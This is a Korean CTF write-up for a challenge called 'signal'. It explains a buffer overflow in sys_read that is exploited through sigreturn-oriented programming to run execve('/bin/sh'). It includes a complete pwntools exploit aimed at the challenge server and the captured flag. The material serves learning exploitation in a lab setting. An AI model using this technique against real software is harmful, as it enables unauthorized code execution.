# Cykor 여름방학 과제

## signal

문제의 이름처럼 signal을 사용해서 푸는 문제였다. 

![](https://user-images.githubusercontent.com/64826730/91458194-3348df00-e8c0-11ea-89cd-9e1c95e0f99d.png)

nx만 걸려있고, 문제에 libc파일이 없어서 aslr도 없다고 생각하고 풀었다.

![](https://user-images.githubusercontent.com/64826730/91458204-3643cf80-e8c0-11ea-9507-d71faa125867.png)

아이다로 열어서 start부분을 살펴보면 먼저 0x40018c에 위치하는 함수를 호출하는 것을 확인 할 수 있다. 

![](https://user-images.githubusercontent.com/64826730/91458216-38a62980-e8c0-11ea-8d06-4658a7fe2430.png)

해당 함수는 위의 사진처럼 syscall을 이용해서 sys_read를 호출한다. 
이후에는 start로 돌아와서 sys_exit를 호출하고 종료한다.

![](https://user-images.githubusercontent.com/64826730/91458231-3ba11a00-e8c0-11ea-9444-cc3bdfea5ed3.png)

바이너리 안에 존재하는 다른 함수인 0x40017c를 열어보면 sigreturn을 호출하는 것을 알 수 있다. 

***

### sigreturn 

syscall에서 rax=15일때 발생.

esp부터 차례대로 읽어오면서 프로그램의 레지스터를 새롭게 설정하므로, 원하는 함수를 호출할 수 있다. 

pwntools에서는 frame = frame = SigreturnFrame(arch="amd64")로 frame을 선언하고, frame.rax = 0x3b, frame.rdi = binsh등으로 값을 설정한 뒤 payload += str(frame)등의 형태로 붙여주기만 하면, 나머지 레지스터값은 알아서 설정해준다. 

참고 : https://gyeongje.tistory.com/378

***

sys_read부분에서 bof가 발생할 수 있기 때문에, 리턴 주소를 sysgreturn으로 바꾸고, sigretrun을 통해서 sys_execve를 실행시키는 방향으로 진행했다. 

```python 

from pwn import *

#level 1
#p = process("./signal")
p = remote("srv.cykor.kr", 31007)
sig_return = 0x400180
syscall = 0x400185
binsh = 0x4001ca

#level2
payload = '1'*40
s = [0x80,0x01,0x40,0x00,0x00,0x00,0x00,0x00]
for i in s:
    payload+=chr(i)
print(len(payload))

frame = SigreturnFrame(arch="amd64")
frame.rax = 0x3b
frame.rdi = binsh
frame.rip = syscall

payload += str(frame)


#level3
p.sendline(payload)
p.interactive()

```

![](https://user-images.githubusercontent.com/64826730/91458249-3f34a100-e8c0-11ea-9c75-ed193922ecaf.png)

flag = cykor{w31c0m3_70_s19r37urn_~_~}



